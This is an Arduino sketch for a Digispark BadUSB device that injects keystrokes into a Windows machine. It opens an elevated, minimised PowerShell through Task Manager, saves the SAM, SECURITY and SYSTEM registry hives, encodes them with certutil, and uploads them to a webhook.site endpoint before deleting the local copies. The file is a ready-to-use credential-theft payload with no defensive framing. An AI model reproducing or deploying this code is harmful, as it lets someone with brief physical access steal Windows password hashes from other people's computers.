#include "DigiKeyboard.h"
#define KEY_TAB 0x2b
void setup() {
  pinMode(1, OUTPUT); //LED on Model A 
}
void loop() {
  
  // Open PowerShell
   
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);

  // Set Layout to US
  
  DigiKeyboard.print("Set");
  DigiKeyboard.sendKeyStroke(56);
  DigiKeyboard.print("WinUserLanguageList ");
  DigiKeyboard.sendKeyStroke(56);
  DigiKeyboard.print("Force en");
  DigiKeyboard.sendKeyStroke(56);
  DigiKeyboard.print("US");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  // Exploit (Add your code here)
  
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);
 
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
  DigiKeyboard.delay(200);
  DigiKeyboard.println("taskmgr"); //starting taskmgr
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_F, MOD_ALT_LEFT); 
  DigiKeyboard.sendKeyStroke(KEY_N);//run
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("powershell -noexit -command \"mode con cols=18 lines=1\"");//start tiny PowerShell
  DigiKeyboard.sendKeyStroke(KEY_TAB); 
  DigiKeyboard.sendKeyStroke(KEY_SPACE);//turn on admin privileges
  DigiKeyboard.sendKeyStroke(KEY_ENTER); //run
  DigiKeyboard.delay(1000);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("taskkill /IM \"taskmgr.exe\" /F ");//killing taskmanager
  DigiKeyboard.println("cd $env:temp"); //going to temporary dir
  DigiKeyboard.delay(300);  
  DigiKeyboard.println(F("PowerShell.exe -windowstyle hidden {reg save HKLM\\SAM SA.B; certutil -encode -f SA.B SA.B; reg save HKLM\\security SE.B; certutil -encode -f SE.B SE.B; reg save HKLM\\system SY.B; certutil -encode -f SY.B SY.B;$U='http://webhook.site/<YOUR_WEBHOOK_ID>';Invoke-WebRequest -Uri $U -Method POST -Infile SA.B;Invoke-WebRequest -Uri $U -Method POST -Infile SE.B;Invoke-WebRequest -Uri $U -Method POST -Infile SY.B;del *.B;exit}")); //This is where all the magic happens
  
  //turn on led when program finishes

  DigiKeyboard.delay(200);  
  digitalWrite(1, HIGH); 

  // Set Layout to DE

  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell -noexit -command \"mode con cols=18 lines=1\""); //smallest window possible
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("Set-WinUserLanguageList -Force de-DE");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for(;;){ /*empty*/ }
}
